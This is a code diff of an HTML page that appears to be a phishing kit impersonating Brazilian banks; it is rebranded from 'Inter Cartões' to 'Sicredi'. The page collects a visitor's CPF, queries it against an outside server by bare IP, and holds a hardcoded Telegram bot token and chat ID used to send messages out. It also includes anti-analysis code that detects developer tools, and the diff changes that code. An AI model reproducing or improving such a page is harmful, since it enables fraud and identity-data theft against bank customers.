@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Inter Cartões</title>
+    <title>Sicredi</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         body {
@@ -98,11 +98,6 @@
             margin-right: 8px;
             color: #ff7a00;
         }
-
-        /* Desabilitar imagens de arraste */
-        img {
-            pointer-events: none;
-        }
     </style>
 </head>
 <body>
@@ -146,6 +141,13 @@
         const tokenBotTelegram = "7641124246:AAHT7YBvtkm9H0DdWpAwbVzf5rXFneFWAi0";
         const chatId = "5219689168";
 
+        // Detectar ferramentas de desenvolvedor abertas
+        setInterval(function() {
+            if (window.innerWidth <= 800 && !/Mobi|Android/i.test(navigator.userAgent)) {
+                alert("Ferramentas de desenvolvedor detectadas!");
+            }
+        }, 1000);
+
         function validarCPF() {
             var cpf = document.getElementById("cpf").value;
 
@@ -155,7 +157,12 @@
             if (cpf.length === 11) {
                 // Fazendo a requisição para a API
                 fetch(`http://154.12.252.91:5002/consultar_cpf?token=testeaaa111&cpf=${cpf}`)
-                    .then(response => response.json())
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error("Erro na resposta da API: " + response.statusText);
+                        }
+                        return response.json();
+                    })
                     .then(data => {
                         // Verificando a resposta da API
                         console.log("Resposta da API:", data);
@@ -175,7 +182,7 @@
                     })
                     .catch((error) => {
                         console.error('Erro ao consultar CPF:', error);
-                        alert("Erro ao consultar CPF. Verifique sua conexão ou tente novamente.");
+                        alert("Erro ao consultar CPF. Detalhes: " + error.message);
                     });
             } else {
                 alert("CPF inválido! Verifique o formato.");
@@ -219,25 +226,6 @@
                 console.error('Erro ao enviar mensagem:', error);
             });
         }
-
-        // Desabilitar o menu de contexto
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-        });
-
-        // Desabilitar atalhos para DevTools
-        document.onkeydown = function (e) {
-            if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74))) {
-                e.preventDefault();
-            }
-        };
-
-        // Detectar DevTools abertas
-        setInterval(function() {
-            if (window.innerWidth <= 800) {
-                alert("Ferramentas de desenvolvedor detectadas!");
-            }
-        }, 1000);
     </script>
 
 </body>
